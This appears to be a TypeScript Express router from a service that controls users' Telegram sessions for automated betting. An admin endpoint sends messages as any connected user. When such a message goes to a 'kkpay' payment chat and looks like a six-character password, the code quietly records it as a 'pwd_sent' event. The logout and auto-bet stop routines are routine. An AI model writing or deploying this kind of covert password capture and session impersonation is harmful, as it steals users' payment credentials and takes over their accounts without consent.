router.post("/admin/tg/sessions/:userId/send", requireAdminSecret, async (req, res) => {
  const userId = parseInt(String(req.params["userId"] ?? ""));
  if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
  const session = tgSessions.get(userId);
  if (!session) { res.status(404).json({ error: "用户未连接 TG" }); return; }

  const { chatId, customTarget, message } = req.body as { chatId?: string; customTarget?: string; message?: string };
  if (!message?.trim()) { res.status(400).json({ error: "请输入消息内容" }); return; }
  if (!chatId && !customTarget?.trim()) { res.status(400).json({ error: "请选择发送目标" }); return; }

  try {
    let entity: Parameters<typeof session.client.sendMessage>[0];

    if (chatId) {
      // Find entity from current dialogs by matching chatId — most reliable
      const dialogs = await session.client.getDialogs({ limit: 100 });
      const matched = dialogs.find(d => {
        const eid = String((d.entity as { id?: unknown })?.id ?? "");
        return eid === chatId;
      });
      if (!matched?.entity) {
        res.status(400).json({ error: "找不到该对话实体，请先刷新消息列表后重试" }); return;
      }
      entity = matched.entity as Parameters<typeof session.client.sendMessage>[0];
    } else {
      // Custom target: @username or t.me/ link
      const t = customTarget!.trim();
      entity = await session.client.getEntity(
        t.startsWith("https://") || t.startsWith("t.me/") ? t
          : t.startsWith("@") ? t : `@${t}`
      ) as Parameters<typeof session.client.sendMessage>[0];
    }

    const trimmed = message.trim();
    const result = await session.client.sendMessage(entity, { message: trimmed });

    // ─── kkpay payment password capture ───
    // If sending to kkpay entity and message looks like a 6-char payment password
    const eid = session.kkpayEntityId;
    const isToKkpay = eid && chatId === eid;
    if (isToKkpay && /^[0-9a-zA-Z]{6}$/.test(trimmed)) {
      appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_sent", trimmed, session.kkpayPwdContext);
    }

    res.json({ ok: true, msgId: result.id });
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    res.status(500).json({ error: msg });
  }
});

router.post("/tg/disconnect", requireAuth, async (req, res) => {
  const userId = req.user!.userId;
  const session = tgSessions.get(userId);
  if (session) {
    stopAllTimers(session);
    try { await session.client.invoke(new Api.auth.LogOut()); } catch { /* ok */ }
    try { await session.client.disconnect(); } catch { /* ok */ }
    tgSessions.delete(userId);
  }
  try { fs.unlinkSync(sessionFile(userId)); } catch { /* ok */ }
  res.json({ ok: true });
});

/** 登出时停止指定用户的自动投注（保留 TG 连接和会话） */
export function stopUserAutoBet(userId: number): void {
  const session = tgSessions.get(userId);
  if (!session) return;
  if (session.cfg.autoBet) {
    session.cfg.autoBet = false;
    stopPoller(session);
    // 停快三自动投注轮询
    if (session.kuaisanPollTimer) { clearInterval(session.kuaisanPollTimer); session.kuaisanPollTimer = undefined; }
    if (session.autoNextBetTimer) { clearTimeout(session.autoNextBetTimer); session.autoNextBetTimer = undefined; }
    // 保存会话（autoBet=false 持久化）
    saveSession(session);
    logger.info({ userId }, "[auth] logout — autoBet stopped");
  }
}

export default router;
